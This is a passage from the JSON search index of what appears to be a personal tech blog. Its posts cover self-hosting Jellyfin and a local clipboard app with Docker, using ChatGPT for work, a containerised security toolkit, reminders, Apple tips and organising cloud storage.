spin them down or up. I use a master stack because I have two server machines, one for all the primary services I use daily, and the other for development and trial runs. So, the master stack is useful for deploying the primary services on the main server.In conclusion, I think Stacks is an awesome feature of Portainer!" }, { "title": "Jellyfin in Home Lab", "url": "/blog/posts/homelab-jellyfin/", "categories": "Home Server", "tags": "jellyfin, home-lab", "date": "2023-05-06 14:01:00 -0400", "snippet": "DeploymentJellyfin Container InstallationPlex is a great home media server, but Jellyfin has recently gained a lot of traction. Also, it is much simpler to setup directly and doesn’t need the activ...", "content": "DeploymentJellyfin Container InstallationPlex is a great home media server, but Jellyfin has recently gained a lot of traction. Also, it is much simpler to setup directly and doesn’t need the activation for mobile devices. Plex requires a web-based account to claim a server and then use the account to login and interact with the server. Frontend webapps/apps are needed to interact with the sevrer. Jellyfin is different as it just loads the web service on the web UI that directly interacts with the backend, rather than being a separate app component that can connect to multiple backends. Basically, Jellyfin is pretty similar to Plex in its offering but with added simplicity.The best way to use Jellyfin Media Server is to use its docker container. Jellyfin offers a docker image that can be used to run the container. First create a directory as follows →mkdir -p $HOME/jellyfin/{config,cache}Then launch the container as follows →# replace the media mount with an appropriate directorydocker run -d \\--name=jellyfin \\-p 8096:8096 \\-v $HOME/jellyfin/config:/config \\-v $HOME/jellyfin/cache:/cache \\-v /media/tanq/Tanishq/Media/:/data/media \\--restart unless-stopped \\jellyfin/jellyfinAn equivalent Docker compose template or a template to deploy using Portainer stacks is as follows →services: jellyfin: image: jellyfin/jellyfin container_name: jellyfin restart: unless-stopped # expanding $HOME in volumes so that Portainer can deploy correctly # since $HOME means something else in the Portainer container volumes: - /home/tanq/jellyfin/config:/config - /home/tanq/jellyfin/cache:/cache - /media/tanq/Tanishq/Media/:/data/media ports: - 8096:8096The good part here is that there is no need to do a claim and link an online account like in Plex. The three main volume mounts here are quite similar to the ones used by Plex needed for the follows → /config and /cache → used to maintain state, watch history, etc. /data → preferably mount an external hard disk with shows, movies, etc.Setup and Data FormatFor the main media store, the data should be formated as best as possible. Jellyfin has a similar show processor to Plex. It reads the metadata of files and names of folders and files to guess the TV show or movie name and pull details from multiple sources to display that information to the user. Like Plex, this is not often accurate; therefore, it’s best to follow a naming structure just like for Plex.For TV shows and Anime, TVDB is the best source and for movies, TMDB is the best. TMDB also seems to contain everything related to shows like TVDB. The idea is that the naming for each folder (or a single file if needed for movies) should be named with the following format →&lt;NAME&gt; (Year) [tvdbid-&lt;id&gt;] The tvdbid and tmdbid IDs can be obtained by visiting the show on the respective DB sites. The sites also list the full name and year, both of which are also important for perfect matches.Ensuring this naming scheme is the best way to avoid any issues with content match. After that, everything’s good to go!Music can also be added to Jellyfin and the nomenclature of that is pretty simple - just Artist/Album/Song. Also, like Plex, Jellyfin also has support for Live TV and Photos media.Migration from PlexIf you have data named according to Plex with {tvdb-xxxxx} and {tmdb-xxxxx} format, all the files can easily be converted to Jellyfin-supported format. Run the following python code via an interpreter in the directory that contains your media (one type at a time like tv-shows, then movies, then others).import osdata = os.listdir()for i in data: os.rename(i, i.replace('tmdb-', 'tmdbid-').replace('tvdb-', 'tvdbid-').replace('{', '[').replace('}', ']'))This converts it into the correct format, then Jellyfin should be able to recognize all media accurately." }, { "title": "Local Content Share in Home Lab", "url": "/blog/posts/homelab-local-dumpster/", "categories": "Home Server", "tags": "local-content-share, home-lab", "date": "2023-05-06 00:09:00 -0400", "snippet": "This is an application I wrote to solve several of my needs that are listed throughout the text here. The idea behind this application is effectively that it acts like a local network clipboard wit...", "content": "This is an application I wrote to solve several of my needs that are listed throughout the text here. The idea behind this application is effectively that it acts like a local network clipboard with history and support for displaying raw text for copying. It can render markdown files in GitHub-flavored MarkDown in light and dark themes, and store files to share within the local network. All updates made by any device are immediately (within 1 second) reflected on all other devices.Basically, it keeps text dumps, files, and links available for any device in a local network. The code lives in the repository Local Content Share.I’ll come back to the motivation behind building this application at the end, but for now, let’s see how to use it!Installation &amp; ExecutionI maintain an image on docker hub, which can be used directly as follows →docker run --rm -d \\--name local_dumpster -p 5000:5000 \\-t tanq16/local_dumpster:main Use “tanq16/local_dumpster:main_arm” for ARM64 images (apple silicon or raspberry pi).To stop the container, do the following →docker stop local_dumpster -t 0An equivalent Docker compose template or a template to deploy using Portainer stacks is as follows →services: local_dumpster: image: tanq16/local_dumpster:main container_name: local_dumpster ports: - 5000:5000If you want to build the image yourself instead, check out the last section.UsageDeploy the container on a server and then visit http://&lt;server&gt;:5000 to use the application.This is a Flask-based application that stores all the information entered within as files inside the container. Note that the files are inside the container and will not persist across container restarts (like an actual digital clipboard). If you need that functionality, modify the Dockerfile to comment the COPY instruction and mount the repo directory using -v while running the container. Refer to the last section to build the image yourself.This is an example screenshot of what the UI looks like →The functionalities available here are as follows → Text Store → The first text area on the UI is where you can paste any text and then, click the “Add text!” button to store it. The empty section below will get populated with the available list of text pastes with the first line as the name and options to view raw content, render as markdown in light and dark modes, and delete the text. File Store → For aesthetics, the file selection button is hidden, so click the “❯” icon beside the “Add file!” button to expand the file selection input. Then select a file with that button and click “Add file!”. Similar to Text Store, another section will get populated for files with an option to download and delete. Link Store → Like the other sections, there is a link paste section below, so add a link and click the “Add link!” button. The last section will get populated with all available links (clickable) and an option to delete. Render MarkDown → Visit http://&lt;server&gt;:5000/print or http://&lt;server&gt;:5000/print to render a markdown dump in GitHub-flavored light and dark modes, respectively. This option doesn’t persist the pastes. Deleting text and files requires confirmation, while links do not.MotivationAs noted in this blog post, the SnapDrop local variant depends on a TURN server, which isn’t the best option with respect to security. I needed a local-only service, so I modified SnapDrop to work only locally.That works, but there are some other issues with it as well → Some end-user management services can deny connection to unknown servers over WebRTC The application only allowed single pastes and files to persist at a time The text always overflowed on the UI, and tabs and spaces weren’t always honored It depended on the clean establishment of a “room” with the participants and involved a bunch of refresh actions from time to time to get that establishedHalf of these issues happened because of the peer-peer nature of the application. So, I created an application with more functionality that functions primarily on the backend rather than end nodes. This application fixes all the issues mentioned above, even honoring spaces and tabs since there is an option to view raw content.Self-BuildUse the following commands to clone the repo and enter it →git clone https://github.com/Tanq16/local-content-sharecd local-content-shareUse the following command to build the container →docker build -t local_dumpster .Finally, run the container (with your port of choice on your host; default - 80) using this command →docker run --name local_dumpster --rm -p 5000:5000 -d -t local_dumpsterWhen done, do the following to stop the container →docker stop local_dumpster -t 0The container will need to be stopped, built and run again to reflect changes to the code. Alternatively, modify the Dockerfile to provide a shell and mount the code into a volume. Then run Flask with debug mode to trigger changes automatically.And that’s everything this application does!" }, { "title": "Unleashing ChatGPT - A Guide for Professional Use", "url": "/blog/posts/howto-on-chatgpt/", "categories": "Computers and Fun", "tags": "chatgpt, programming, productivity", "date": "2023-05-01 02:57:00 -0400", "snippet": "ChatGPT PrimerOpenAI developed a state-of-the-art language model based on the GPT architecture that uses deep learning to generate human-like responses to natural language input. It ingests text in...", "content": "ChatGPT PrimerOpenAI developed a state-of-the-art language model based on the GPT architecture that uses deep learning to generate human-like responses to natural language input. It ingests text input and processes it in multiple steps to refine the understanding of the input. It then uses autoregression to generate a response one token at a time, using the previous output to generate the next token. The model has been trained over a massive dataset of websites, documents, and books up to the end of 2021.Understanding It BetterChatGPT is very powerful, as we’ll soon see, but it is important to recognize its limitations. It’s important to note that ChatGPT is not Artificial General Intelligence (AGI) and should not be thought of as such; instead, it’s an AI model aimed at text generation. This means that it cannot generate pure conscience-based logic but rather is a text-generation model. That’s why there’ll always be limitations in what it can come up with.The quality of the output is highly dependent on the input it receives. Because it generates output from the corpus it is trained on, it may generate biased or incorrect responses. As such, it shouldn’t be considered a “source of truth”. It can come up with grammatically correct text or syntactically correct code, but all of that is a testament to how good the model is, not to how “sentient” it is. Spoiler alert: it is not sentient, it’s a generator, and you can pick up on that if you use it and experiment with it enough.However, ChatGPT can significantly increase productivity and provide useful insights for several professional jobs when used smartly. Let’s see how!Example Use CasesFollowing here is a set of use cases that I’ve performed with the help of ChatGPT and should be enough to showcase exactly how it can fit into professional workflows.Ideation and Language GenerationAs established before, ChatGPT has been trained on a huge amount of text, so it’s quite easy for it to generate example language for things like blog posts, emails, topic titles, etc. Try these out → Write me a sample letter of recommendation for a bachelor’s student for his outstanding performance on academic projects and examinations. Also, mention his excellent research work on 3 papers published in famous journals on artificial intelligence. End it with recommending the student for further studies commending his high aptitude for research and problem-solving. Build me a step-by-step plan for programming a Chrome extension that keeps track of the time spent on each tab and reports when I spend more than 1 hour on a tab. I am writing a blog post on how to get started in binary exploitation. I will go through the basic concepts and introduce advanced topics such as ASLR and heap exploitation. Suggest me some good titles for this post.Now read the responses and see how usable those are! That’s the strength of ChatGPT - take in text dumps, contextualize them, and produce meaningful text. For all these queries, it’s super easy to use the responses as a base and create something unique and impactful out of it. I used ChatGPT to generate quite a bit of language for my previous blog post, Streamlining Security-Related Workflows with Docker Containers.Conceptual LearningSince ChatGPT is trained on public websites with documentation for several kinds of service providers such as AWS, GCP, Kubernetes, etc., so it’s an awesome entry point to getting information about theoretical concepts. Try these → What are admission controllers in Kubernetes? Give me an example and tell me how to deploy it in my cluster. What are the security best practices for exposing an RDS instance to the public? If I want to give direct access to an RDS database to certain developers, what would be the best way to do so? Explain to me what Azure Active Directory is and how can an example startup company use it with an e-commerce coupon service offering.NOTE: This is the place where people get tripped up. Do you consider this information to be the source of truth? Absolutely not! There are high chances of the information being correct, but the intent is to get a general sense of what you’re looking for. You save time by getting an introduction to a topic right away in a concise manner rather than spending the next 10-15 minutes doing Google-fu. Then after a quick 2-3 minute read of the information, you can start researching the things that matter based on the terms and keywords you get from ChatGPT’s result. Overall, this has the potential to cut your research time in almost half, and that’s huge!Skip Library DocumentationOften, we encounter situations where we need to look up SDK documentation to understand source code or to get to know how to perform a certain action in a given programming language. This is especially true for cybersecurity, where there is a need to understand and analyze source code quickly. There could also be situations where one is working on a project but has to incorporate a different language for a particular segment. Having documentation at your fingertips is very useful in such situations. Since ChatGPT has ingested documentation from the internet, it’s easy to generate text related to specific libraries or functions within those libraries. Here’s an example → What functions should I use to implement storage of variables in Keychain in Flutter?Look at the response, and you can implement that part in Flutter without reading any documentation and looking up examples. That’s a really quick way to get information. But once again, this isn’t the source of truth! It will produce accurate information almost all the time, but definitely fact-check for super-niche things.Programming and ScriptingScripting is one of the most common activities that a cybersecurity professional needs to perform. Even otherwise, computer science professionals often need to generate definitions of functions to make their job easy. Look at the following examples → Write a function in PHP that implements a rot13 cipher for the provided text, which is obtained from a GET request parameter. Write me a Python script that checks the current IP address and returns a red colored text “APIPA” if the machine has an APIPA address, otherwise tests a lookup to “google.com” and returns “Success” in green if it succeeds or “Failure” in red if it fails.Now here is the catch → ChatGPT will generate code based on numerous examples that it has ingested from a huge corpus of text. Quite often, that code will not execute as expected outright. But we’re all smart people and can do minor tinkering to ensure everything is as we want and get a working code at the end. The catch is, instead of spending time writing it ourselves from scratch and trying to read documentation or StackOverflow for stuff that we don’t have in our brains, we leverage ChatGPT to generate a starting point for us. Once there, it’s super easy to repackage that to obtain the desired end result. This has saved me a ton of time when writing scripts for different things.Programming to the MaxWe’ve seen how ChatGPT can help us generate code for scripts or helpful function definitions when we need them. Here’s some more advanced stuff, which is very hit-or-miss from a conversation continuity point of view, and there’s some wording hacks that we need to employ → Write me IaC in Terraform to deploy a Lambda function with a tag production: true and a lambda execution role with the permissions of s3:ListBuckets, s3:GetObjects, s3:ListObjects on all resources. Additionally, configure an event bridge trigger to invoke the Lambda function using a cron job every day at midnight.Literally, this output is insane!! Look at how much time it saves you! Here’s another example use case → Write me a step-by-step plan to build a website that presents a form to the user and accepts contact information for the user in that form. With all the information received, the data is stored in an SQLite database, and the user is prompted “Subscribed”. I want to build this using Flask and deploy it in a docker container. In the backend, in the same container, I also want to run a cron script that sends an email with a SendGrid API token passed as an environment variable to the container to all the users in the SQLite database. I also want an appropriate Dockerfile for the container. Write me the numbered step-by-step plan, and I will ask you about details for each step by referring to its number.Follow this with interactions like → Give me the details of steps 1 and 2 from this plan.And you can literally get help implementing this entire project from the ground up! Think of how much time ChatGPT would save for such a project. That is AWESOME if nothing else, but you have to agree it is super helpful.Word of CautionAlways keep 2 things in mind → ChatGPT is not the source of truth for any information.What’s more, technically, it’s outdated, so if you need more up-to-date information, prefer Google Bard or Bing Chat with low creativity factors. DO NOT write sensitive information into ChatGPT text prompts.People will always make mistakes, and those mistakes are the primary cause of leaks and compromise. Special note on ensuring that you do not enter any information related to your company’s IP (intellectual property) or your clients’ IP.OutroBeing able to generate code, provide detailed information on specific topics, etc., makes ChatGPT an amazing tool that can help save hours of time and increase productivity. Despite its limitations, ChatGPT is one of the best tech tools that has surfaced recently. It’s a valuable tool in the computer science and cybersecurity fields. I hope this post provides insights into how ChatGPT should be used in the intended way to improve your workflow." }, { "title": "Streamlining Security-Related Workflows with Docker Containers", "url": "/blog/posts/docker-for-security/", "categories": "Computers and Security", "tags": "docker, container, productivity, security", "date": "2023-04-30 01:39:00 -0400", "snippet": "I’m generally always looking for ways to improve my workflow and make my work as a cybersec professional more efficient. One of the tools that has had the biggest impact on my work is Docker.What i...", "content": "I’m generally always looking for ways to improve my workflow and make my work as a cybersec professional more efficient. One of the tools that has had the biggest impact on my work is Docker.What is Docker?Docker uses cgroups and namespaces to dedicate a limit-enforced set of resources for containers to run in an isolated environment as a process. Docker uses layers of filesystem, together called an image, which acts as the filesystem for the isolated process. Containers are also not a virtual OS, rather a process running in the host OS. This allows containers to have a completely isolated environment with a separate process tree and filesystem. Images are essentially a snapshot of the filesystem and containers created with those images add a writeable layer on top to make local changes to the filesystem.With all this, it enables developers to build, ship, and run applications in containers packaged as images. The writeable filesystem layer is destroyed after the container stops, therefore, images are basically self-contained snapshots that package an application and its dependencies together, making it easier to deploy the application across different environments.Using Docker for Security-Related WorkAs mentioned before, the writeable layer is what makes the image a container in simple terms. But it isn’t persistent since containers are created from images. So when a container is stopped, all those changes are removed. One way of keeping filesystem changes persistent is using volume mounts. Essentially, a local directory on the host is mounted on the container allowing that directory to be a state-preserving directory present on the host. This can be used to provide persistence in containers. Now on to how and what to use this for.As a security engineer, I work with a variety of different tools in several kinds of environments. Usually, security engineers would install tools and libraries on their workstations, or maybe create a virtual machine that they keep up to date and use for cloning into other VMs that they use for specific work. I would often do the same but encounter issues like maintaining a base virtual machine, facing errors stemming from conflicting Python environments, OS type or version issues, and module mismatches. Docker, or rather, containers have solved most of these issues for me by providing me with a standardized environment that I can use across all my projects and any machine.In my Github repository for Containerized Security Toolkit, I have shared a Docker image that I use for all my security-related work. This image is based on Ubuntu and contains all the tools that I use for security reviews and pentesting, including stuff like Nmap, Project Discovery tools, Scout Suite, Trivy, etc. The repo also has a CI process that builds the image regularly and pushes it to Docker Hub. Using a single Docker container for all my security-related work has been a game-changer.How is it Helpful?Standardized EnvironmentA containerized instance provides a standardized environment that I can use across all my projects. This means that all my tools are updated and consistent, which makes it easier for me to switch between different environments without having to install all the necessary tools each time. All the tools are installed directly via CI in the image and are quite up-to-date. The CI ensures that my tools in the latest image are completely reliable. Aside from the tooling, even the shell experience, or as otherwise put in the community as dotfiles, can also be baked into the container and provide a seamless experience.PortabilityThe Docker container can be deployed absolutely anywhere. This means that it’s extremely simple to take my work to another laptop or a cloud VM without having to install all the necessary tools each time. It’s also easy to share my container with others. Since all of it is basically maintained by a single Dockerfile, it’s also easy to customize workflows like the Lazy script or the AutoRecon workflow and deploy them as container tasks so that input can be passed to cloud functions which then execute the containerized workflows and return the result easily without having to go through installing or updating tooling to take to different execution environments.Community SupportI prefer using Ubuntu as the base image layer since it is the most widely used Linux distro with a very well-established online community. Any issues encountered can easily be solved since people discuss a whole lot of issues surrounding tooling or software in Ubuntu on platforms like forums, blogs, etc. This makes troubleshooting much easier and faster.An Isolated &amp; Simplified WorkflowManaging dependencies, environments, or libraries is one of the most frustrating parts of installing several tools on a given OS. Special attention to things like Python environments or OS version mismatch. One very common issue with MacOS is that of Python versions since there is a MacOS-specific Python and a Brew-installed Python, both of which sometimes share the same pip executable or some STL, and installing something with the Brew-Python installs it in the MacOS Python path, calling which via the MacOS Python then doesn’t sit well with its version and Brew-Python executables get symlinked to MacOS Python. After that, suddenly the only Python version available is an older MacOS Python which can’t access any modules installed using brew-python. Yes, something like this did happen once.Of course, using virtual environments reduces the frequency of encountering such an error, but what do you do when you encounter such an issue? Try to fix it? Definitely not, because we’re all on a clock. Running these things inside the container solves this issue. And if something goes wrong, the container can just be restarted from a base working condition without any issue. So, I don’t have to worry about managing dependencies or libraries when working off of a container, which saves me a lot of time and effort.Using A ContainerMy Docker container is available publicly on Docker Hub aimed at security-related workflows with the GitHub repo at Containerized Security Toolkit. It’s straightforward to get started and all that’s needed is to pull the image and start using it or clone the repository and build a modified version of the Dockerfile. It’s just that simple! There are more considerations and nuances such as using SSH instead of docker exec to get a shell to the container, but all of that’s well explained in the repo. I recommend the quick-start section. But even outside of using that image, there’s a whole host of possibilities for running workflows from docker which significantly improve the quality and efficacy of security-related work.ConclusionDocker is an essential tool for me and I think should be on the minds of other professionals in the tech industry. Using a Docker container has allowed me to simplify my workflow, save time, and focus on my work. I highly recommend using Docker containers for anyone involved in security-related work. Cheers!" }, { "title": "How to Effectively Use Reminders and To-Dos", "url": "/blog/posts/newbified-howto-reminders-todo/", "categories": "Computers Newbified", "tags": "reminders, productivity, to-dos", "date": "2022-11-26 14:00:00 -0500", "snippet": "What are Reminders and To-Dos?I believe reminders started out as a cover term for ticks that can remind us about doing something, where the ticks could also be other humans. To-Dos on the other han...", "content": "What are Reminders and To-Dos?I believe reminders started out as a cover term for ticks that can remind us about doing something, where the ticks could also be other humans. To-Dos on the other hand are basically a checklist to just mark things off as we do them. The difference here is → reminders are for time-sensitive things while to-dos are for making a list of items we need to do.Productivity can Go Overboard - What do you do?There can be many methods of doing productive work online using reminders and to-dos effectively - many frameworks and many usage ideas. However, going blindly behind those preachings is not a good idea as it only overwhelms a person in what is sustainable for them. As such, this is a disclaimer section telling you that you should explore techniques and tips, put them into practice, and then pick and choose those methods that actually work for you. Ideally speaking, a month is a good amount of time to confirm whether a technique sticks with you or not as that much of time usually covers a busy day as well as a comfortable day, both of which are important to judge the efficacy of a productivity techinque.So, the golden path for someone trying to improve their reminders game, is → research fundamental techniques that look appealing and feel promising to you. Then list out a couple examples of things that you forget and things that you make (or would make) a post-it note for. Soft-check against those techniques based on what may work or what may not work. Take the top 3 techniques and implement those one by one. The last step is to reduce copmlications - apply your own twist to the technique you choose and then keep improving it!The Etherios WayA funny way to name something I do using Apple Reminders, but here it is →RemindersThere is just one list of reminders called “Master”. This list stores all time-bound actions whether it be something I want to do at a specific time or periodic ones like rent payments. Eevryhing that I want to be reminded about at a specific time goes into this list, irrespective of what it’s related to. At the end of the day, the philosophy behind reminders is - when you get a notification, take an action immediately (perform or reschedule). And that’s it! That’s all that I have for reminders!To-DosMostly everything apart from time-bound actions fits into to-do lists. I maintain 6 separate lists → Activities → Things that I need to do in my personal life (change bottle filter, look at smartwatches, analyze my health data, etc.). These are things which I need to check off in the near (not long) future. Work Activities → This list is like Activities but for my professional life; something that is not meant to carry details but just things to check off (review calendar for the next week, collect notes for the next manager meeting, etc.). Groceries → Self explanatory! Household → Like Groceries, but for household items (bulbs, cleaners, portable fans, mousepad, etc.). Purchase Wishlist → A checklist of links for items I like online and want to buy at some point. Hobby → Things I want to do for my hobbies such as try drawing a landscape on iPad, reduce size of a docker image I maintain, automate something in my home, etc.The philosophy here is that when breaking down tasks into subtasks, it is easy to make that a checklist and complete them one by one. And such tasks generally don’t have a deadline per se. When I get some downtime, I turn to these lists to see what I can do and check off. It’s a tug of war between growing and shortening the lists.Let’s Talk ApplicationsGenerally, all applications nowadays can do more than enough. I use Apple Reminders app, but a complete list of apps I’ve tried (on the Android+Windows side as well), all of which work just fine for the Etherios Way are as follows → Apple Reminders Tick Tick Google Tasks + Reminders (Reminders exist within the Calendar app and is only reminders not to-do lists, while Tasks is both and is a standalone app) Microsoft To-DoThere are also probably a million other apps but I’d recommend sticking to the top 25 list only as they’re going to be supported for long and will get visual updates regularly (aesthetics are imprtant)." }, { "title": "Interesting Apple Ecosystem Features", "url": "/blog/posts/newbified-apple-ecosystem-features/", "categories": "Computers Newbified", "tags": "apple, productivity", "date": "2022-11-25 14:00:00 -0500", "snippet": " Features in iOS also work on iPadOS. So, iPadOS only contains features specific to the iPad. Also, Siri related features work on all devices. Some specific applications by Apple, such as Safari m...", "content": " Features in iOS also work on iPadOS. So, iPadOS only contains features specific to the iPad. Also, Siri related features work on all devices. Some specific applications by Apple, such as Safari may have common features among all the operating systems.MacOS Handoff Transferring a file from iOS files app to the macOS file manager via airdrop is OK but has many steps. Instead, with a handoff-linked iPhone and Mac (bluetooth+iCloud), a file can be copied on the iPhone and pasted on the desktop or anywhere in the file manager on Mac. Of course, it works cross-device every way with iPad as well. iPhone If an iPhone is connected to the Mac (wired), then the iPhone screen can be shown in a video recording on macOS in QuickTime player. Finder Finder on all devices can allow creating a PDF from multiple images (Quick Actions on Mac). Hold ⌘ Icons on the menu bar can be moved in position by holding down ⌘ and using the mouse to drag them around. Dock To force quit an application from the dock, right click on it while holding down ⌥ to view the option to Force Quit. Screen Sharing Screen sharing support can be delivered/received on MacOS just like on Windows. There is an app called “Screen Sharing” which can be used to connect to another Mac by entering the hostname (for the same network) or the Apple ID (for a remote network). The receiving Apple ID will show a prompt on the receiving Mac to allow full control or shoulder surfing only. The microphone and speakers are automatically enabled for both sides. Hold ⌥ In the Control Center, hold down the ⌥ key and then click the ❯ (visible when hovering) besides the sound bar. This allows selecting input and output audio devices right from the Control Center without going into Settings. Hold ⌥ When resizing windows with the mouse or touchpad, hold down ⌥ to perform resize symmetrically from all sides aligning from the center of the screen. Hold ⌥ Within Finder, hold down ⌥ while dragging a file to duplicate it. This can be done within a folder as well as across folders. Hold ⌥ Hold down ⌥ when pressing the volume up/down buttons to open the sound preferences within settings. Hold ⌥ Hold down ⌥ when expanding a folder in the list view within Finder to expand all nested folders and sub-folders as well. Hold ⌥ The ⌥ key showcases multiple options within the menu items for many apps. These can be pretty useful when an expected option is nowhere to be found. Hold ⌥ When copying files to a destination, MacOS doesn’t show the option to skip files that already exist, instead just shows the options to delete, stop or keep both. To show the skip option, hold down ⌥ when the prompt is active. Hold ⌥ Hold down the ⌥ key when clicking the wifi item on the status bar to reveal information such as IP address, router information and channel. Hold ⌥ Use ⌘ + ⌥ + Delete to permanently delete a file without moving it into System Trash. Hold ⌘ When there are multiple windows open and an action needs to be performed on a window that is not in focus, then hold down ⌘ while clicking on the out of focus window to perform the action without bringing the application into focus. Preview The Preview application on MacOS has a “Redact” tool under the Tools menu which can black out text from a PDF completely without a scope of recovery by any means (which might be otherwise possible when done by overlaying black boxes for example). Reminders When using the Reminders app, click return on an empty reminder to close the keyboard and hide the cursor i.e., write reminder then return to start writing the next reminder, or press return again when the field is empty to end writing the session (kinda like “that’s it”). Hold ⌥ To show the current full path hierarchy of the current folder in Finder, hold down ⌥, which shows the path at the bottom. The final folder in the path can be right-clicked to show the option of copying the location as path. Finder When uploading a file into a file selection dialog, use ⌘ + Shift + G to open a text box for a path, which will instantly open that path in the file selection window. Hold ⌘ Hold down ⌘ when selecting or clicking a file/folder result from spotlight to open it’s enclosing folder in Finder instead of simply viewing it.iPadOS Swipe with two fingers on the iPad keyboard in the enlarged state to move the cursor along the text. Touch and hold with two fingers on the iPad keyboard in the enlarged state to begin selection and then swipe to expand the selection around the text. With a Picture in Picture video running in a window, a full screen app like a game is launched without sound to disallow disruptions in the video while allowing full control in the full screen game. Within the Notes app, if handwritten text is erased, it leaves a blank area where it originally existed. To get rid of this area single tap above the next body of handwritten text and select “Insert space”. Using the movable margin that appears, the space above it can be reduced as well, which effectively gets rid of the empty space. If a handoff-enabled iPad is near the Mac, then getting into the Markup tool inside Preview on Mac will automatically launch the Markup feature on the iPad to allow instant edits on it, which get synced instantly once “Done” is pressed.Apple Watch Covering the watch screen with your palm turns the screen off until the crown or the button is pressed again. In this state, the crown dial can be used to incrementally increase the brightness of the watch face from a very low brightness level. The incremental increase also works in Theater mode. Double finger hold on the watch face to let Siri read aloud the time. Single tapping on the Mickie Mouse face prompts The character to speak the time. When typing on the watch, if your iPhone is unlocked, then a popup appears on the iPhone to allow better control over whatever you were typing. Using voice memos on the Apple Watch, recordings are stored in a dedicated Watch recordings section in the iOS voice memos app. Siri can be triggered using the “Hey Siri” phrase like other devices. However, the best way to trigger it is by bringing the watch closer to your mouth and directly speaking to the assistant. The reminders complication on the watch face always shows the next reminder on the list. However, it can be used to one’s advantage by not adding a time instead just adding a date. What this does is put a set of reminders for the current day in a list called today, which is displayed serially on the watch. If the list is structured in an order of priority, then throughout the day, the watch displays the highest priority task that is pending for the day.iOS Upload an image to Safari, click on Show Selected and then on Actual Size to select uploading in a smaller size. When moving the cursor with haptic touch, tap on the greyed out keyboard with another finger and it will start text selection mode. In the music app, tapping on a song will play it followed by all other songs on that same album, playlist, etc. To play just that song and nothing else, tap on the three dots and select “play last”. This will not add other song to the current list. To save content of a webpage, open it in reader mode and copy from top to bottom. Then paste it inside Apple Notes, which also includes the images. This isn’t possible directly from a Siri Shortcut because scripting loses images or copies then as HTML tags. Holding an option on the Apple keyboard persists it for the duration it is held. Example → hold the ⇧ key and type to output everything in uppercase and leave it for going back to normal. Another example would be to hold the “123” button to view numbers and symbols while it’s held. When music is playing on the iPhone, trigger spotlight (drag down on the home screen) to get more rich internet information about the artist on some occasions under Siri Suggestions. While conversing with someone over, text message in any app, iOS 16 allows instant selection and translation of text to, and from any language through the Translate app. Additionally, the translated text can be instantly replaced with the selected text using the pop-up options that appear after the translation. If the “Silence Unknown Callers” setting is enabled and a call is received from an unknown number that we called first, then that call won’t be silenced.Siri Siri understands context for setting reminders. Ask Siri “remind me about this tomorrow at 9 PM” and it will understand that you need to be reminded about what’s on your screen, example - Safari webpage. Another useful example is Apple Notes which embeds a small notes icon on the reminder to jump directly into the note. Ask Siri “where am I” and Siri will give the closest address or the current address in lookup sheet as well as an option to navigate to/from that place. To share a webpage currently being viewed on safari, following the contextual Siri commands from point one, say something like “send this to Marcus via WhatsApp”. Make a Reminders list called “Shopping List” which can also be interacted with using Siri by saying something like “add milk to my shopping list”. With iOS 16, iPadOS 16 and MacOS Ventura, Siri can be asked to reboot the device and she can do it after a confirmation dialogue." }, { "title": "Overhaul Personal Cloud Storage", "url": "/blog/posts/newbified-overhaul-cloud-storage/", "categories": "Computers Newbified", "tags": "productivity, cloud-storage, data-organization", "date": "2022-09-09 15:00:00 -0400", "snippet": "The following is a process of overhauling personal cloud storage to build an effective data hierarchy and build a collection which can be expanded upon in an efficient manner.Collection of all data...", "content": "The following is a process of overhauling personal cloud storage to build an effective data hierarchy and build a collection which can be expanded upon in an efficient manner.Collection of all dataThe first step for overhauling one’s cloud storage is to collect all information locally on a personal computer storage or external disks. This is the most cumbersome step out of all. Data is usually present in the following places → Cloud Storage Platforms → All data stored in platforms like Google Drive, Dropbox, Box, iCloud Drive, etc. Laptop/Desktop Local Storage → Things stored on personal computers, usually within either of the Desktop, Downloads or Documents folders Smartphone Local Storage → Data stored on smartphones which is usually in the form of downloaded documents, storage from document management applications such as office suites, or scanned documents placed in the storage by apps such as Adobe Scan Physical Documents → All physical paper documents that one has, such as lease documents or health records; these documents should always be digitized even if the documents are necessary to be filed away physically (refer to the data digitization blog post) Contacts → Contact data is usually stored in SIM cards or the smartphone storage; all of these can be quickly imported to Google contacts through the app, which consolidates everything and removes all duplicates as well (the same can be done by other cloud contact platforms like iCloud contacts or Samsung cloud contacts, however, Google contacts is the recommended platform as both iCloud and Samsung can sync with Google contacts) Photos → Photos can be stored at many places such as personal computers, external hard disks, smartphone storage, or iCloud/Amazon/Samsung/Google photos; the idea is that everything should be in 1 or 2 places only (more details further in the blog)Decide the fate of dataOnce all data is collected, the next step is to decide its fate! This means one of 2 things → Do you need to refer to a piece of data ever in the future? This can be “yes” documents like lease documents or health certificates Such documents must be stored Answer to the previous question is “no” Discard that data Usually consists of data such as non-important receipts The main intention here is to reduce the vastness of the collected data and reduce strain on the cloud storage capacity being used for that data (for more than a threshold, it requires payment, so it also keeps the wallet heavy).Build a data hierarchyWith the complete data set downloaded on computer, the next step is to organize them into a folder structure or hierarchy. Storage hierarchy is like a collection of buckets into which relevant data is dumped. A bucket can have several small sub-buckets i.e., sub-folders. The nesting should be minimum and the number of buckets as broad as possible to avoid complicated hierarchy (otherwise it can lead to confusion about “where do I put this?”). An example structure is as follows → Professional work Job Offer Letter Paystubs Other lines of work Contracts Payment invoices Personal Identity Driving License Passport National/State ID Tax Identification Card Passport Sized Photograph Finances Savings Bank Account I Savings Bank Account II Credit Cards Tax Returns Investments Health Vaccinations Insurance Eye Data Housing Leasing Insurance Brokerage Jobs Cover Letters Resumes Job Application Tracking Sheet Certificates Professional Certifications Academic Certifications Family → Like Personal &gt; Identity; but for family members Hobby (music, art, etc.) Miscellaneous → For data that you don’t know where to put (avoid piling this up)For photos, there are just the following two considerations → Paid → Go for full backup storage on Amazon/Google/iCloud/Samsung Photos Free Maintain a backup on local hard disks and maintain a regular cadence to back the photos up at least once a month to avoid loss of data in case of an emergency Make a note to clear videos from smartphones as early as possible to avoid filling up storage Upload the data hierarchyWith the hierarchy ready, now comes the easy step → pickup and drop. The folder structure made previously just needs to be uploaded to a cloud storage platform of choice. All platforms support drag and drop, so just select all folders in the hierarchy and drag them into the website for the cloud storage option. Give it time to upload and that’s it!With data in the cloud, all platforms can provide a smart search feature to search for any file directly from the search bar, or you could just navigate the simple hierarchy.Considerations for selecting a cloud storage platform → Recommendation Ranking Platform Free Plan Storage 1 (Best Overall) Google Drive 15 GB 2 (Great additional features) Box Drive 10 GB 3 (Apple ecosystems) iCloud Drive 5 GB 4 (Heavy Windows/O365 